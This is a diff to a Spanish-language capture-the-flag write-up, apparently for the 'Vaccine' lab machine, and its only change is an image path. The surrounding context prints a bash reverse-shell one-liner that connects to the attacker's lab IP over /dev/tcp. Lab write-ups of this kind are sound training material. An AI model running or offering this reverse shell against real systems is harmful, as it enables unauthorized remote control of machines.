@@ -94,7 +94,7 @@ obtenemos acceso a una shell donde podemos establecer una reverse shell con nues
 bash -c "bash -i >& /dev/tcp/10.10.15.224/443 0>&1"
 ```
 
-![texto_alternativo](../assets/capturas_maquinas/vaccine/9-reverse-shell)
+![texto_alternativo](../assets/capturas_maquinas/vaccine/9-reverse.png)
 
 
 Ahora hay que convertir esta reverse shell en una reverse shell estable para poder trabajar sin que expire la sesión.
